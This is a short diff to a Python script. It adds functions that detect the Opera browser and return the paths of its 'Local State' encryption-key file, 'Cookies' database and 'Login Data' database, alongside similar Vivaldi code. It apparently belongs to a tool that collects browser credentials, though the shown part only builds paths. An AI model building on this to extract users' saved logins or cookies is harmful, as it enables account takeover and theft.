@@ -46,6 +46,23 @@ def vivaldi_exists():
     return os.path.exists(f"{LOCAL}/Vivaldi/User Data/")
 
 
+def opera_exists():
+    LOCAL = os.environ['APPDATA']
+    a = os.path.exists(f"{LOCAL}/Opera Software/Opera Stable")
+    print(a)
+    return os.path.exists(f"{LOCAL}/Opera Software/Opera Stable")
+
+
+def get_opera_directories():
+    LOCAL = os.environ['APPDATA']
+    opera_dir = f"{LOCAL}/Opera Software/Opera Stable"
+    key_directory = f"{opera_dir}/Local State"
+    cookie_directory = f"{opera_dir}/Cookies"
+    login_directory = f"{opera_dir}/Login Data"
+
+    return key_directory, cookie_directory, login_directory
+
+
 def get_vivaldi_directories():
     LOCAL = os.environ['LOCALAPPDATA']
     vivaldi_dir = f"{LOCAL}/Vivaldi/User Data/"
